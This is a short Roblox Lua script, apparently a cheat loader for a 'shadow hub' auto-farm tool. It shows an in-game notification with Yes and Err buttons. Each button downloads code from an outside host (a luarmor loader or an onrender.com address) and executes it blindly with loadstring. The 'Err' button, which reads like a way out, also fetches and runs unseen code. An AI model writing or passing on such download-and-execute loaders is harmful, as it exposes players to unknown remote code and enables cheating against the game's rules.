local StarterGui = game:GetService("StarterGui")

-- 1. Tạo BindableFunction để lắng nghe sự kiện bấm nút
local bindable = Instance.new("BindableFunction")

function bindable.OnInvoke(selectedButton)
    if selectedButton == "Yes" then
        loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/36107afd3107e8d841f9d1a69e2465d4.lua"))()
        -- Đặt code xử lý khi chọn Yes ở đây
    elseif selectedButton == "Err" then
        loadstring(game:HttpGet("https://get-apiroblox.onrender.com/"))()
        -- Đặt code xử lý khi chọn Err ở đây
    end
end

-- 2. Gửi thông báo
StarterGui:SetCore("SendNotification", {
    Title = "shadow hub",
    Text = "auto farm script is ready, do you want to start?",
    Icon = "rbxassetid://91892876206842",
    Duration = 10,
    Button1 = "Yes",
    Button2 = "Err",
    Callback = bindable -- Gắn callback để nhận phản hồi từ nút bấm
})